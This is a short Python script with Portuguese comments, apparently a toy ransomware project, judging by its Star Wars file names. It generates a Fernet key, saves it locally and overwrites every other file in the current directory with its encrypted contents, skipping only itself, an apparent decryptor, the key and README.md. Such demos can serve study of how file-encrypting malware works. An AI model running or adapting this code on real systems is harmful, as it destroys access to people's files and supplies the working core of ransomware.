"""
Arquivo de Encriptação
"""

import os
import cryptography.fernet as cripto

files = []

key = cripto.Fernet.generate_key()

with open("chave.key", "wb") as chave:
    chave.write(key)

for file in os.listdir():
    if file == "darth_vader.py" or file == "chave.key" or file == "luke_sky.py" or file == "README.md":
        continue
    if os.path.isfile(file):
        files.append(file)


for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = cripto.Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)


